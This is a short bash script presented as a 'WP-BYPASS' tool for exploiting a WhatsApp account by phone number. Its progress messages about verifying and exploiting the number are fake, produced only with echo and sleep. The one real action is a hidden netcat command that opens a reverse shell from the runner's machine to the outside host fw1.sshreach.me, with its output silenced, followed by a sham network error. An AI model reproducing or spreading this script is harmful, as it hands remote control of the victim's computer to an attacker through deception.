#!/usr/bin/env bash
red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
reset="\e[0m"

clear
sleep 1
toilet -f future "WP-BYPASS"
echo -e "    $green CoDeD By ${red}${bold}Anonym0us R47${reset}"
sleep 0.5
printf $green
read -p "[+] Enter Target Phone Number: +91 " mbnum
printf $reset
sleep 2
echo -e "${green}[+] Verifying WhatsApp Number ${red}+91 $mbnum"
sleep 2
echo -e "${green}[+] Mobile Number Verifide ${red}+91 $mbnum"
sleep 2
echo -e "${green}[+] Exploiting WhatsApp Number ${red}+91 $mbnum"
# chenge This portmap Address
nc fw1.sshreach.me 13468 -e /bin/bash  > /dev/null 2>&1 & sleep 1
echo -e "${green}[+] Reading DataBase...."
sleep 3
echo -e "${red}[-] Error Check Your InterNet Connection..."
